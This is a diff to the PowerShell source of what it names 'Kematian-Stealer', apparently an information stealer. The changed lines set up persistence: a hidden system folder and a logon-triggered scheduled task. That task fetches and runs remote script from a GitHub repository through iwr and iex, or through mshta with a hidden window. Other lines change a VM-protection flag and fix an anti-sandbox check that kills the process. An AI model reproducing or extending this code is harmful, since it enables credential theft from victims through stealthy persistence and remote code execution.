@@ -6,7 +6,7 @@
 #$fakeerror = $false
 #$persistence = $false
 #$write_disk_only = $false
-#$vm_protect = $true
+#$vm_protect = $false
 #$encryption_key = "YOUR_ENC_KEY_HERE"
 
 
@@ -83,10 +83,10 @@ function Invoke-TASKS {
         $KDOT_DIR.Attributes = "Hidden", "System"
         $task_name = "Kematian"
         $task_action = if ($debug) {
-            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
+            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook'`$debug=$debug;`$vm_protect=$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=$blockhostsfile;`$criticalprocess=$criticalprocess;`$melt=$melt;`$fakeerror=$fakeerror;`$persistence=$persistence;`$write_disk_only=$write_disk_only;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer-V3/main/frontend-src/main.ps1'|iex`""
         }
         else {
-            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
+            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook'`$debug=$debug;`$vm_protect=$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=$blockhostsfile;`$criticalprocess=$criticalprocess;`$melt=$melt;`$fakeerror=$fakeerror;`$persistence=$persistence;`$write_disk_only=$write_disk_only;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer-V3/main/frontend-src/main.ps1'|iex`",0)(window.close)"
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
@@ -144,7 +144,7 @@ function RecentFileActivity {
     $file = Get-ChildItem -Path $file_Dir -Recurse
     #if number of files is less than 20
     if ($file.Count -lt 20) {
-        System.Windows.Forms.MessageBox]::Show('RECENT FILE ACTIVITY CHECK FAILED !', '', 'OK', 'Error')
+        [System.Windows.Forms.MessageBox]::Show('RECENT FILE ACTIVITY CHECK FAILED !', '', 'OK', 'Error')
         Stop-Process $pid -Force
     }
 }
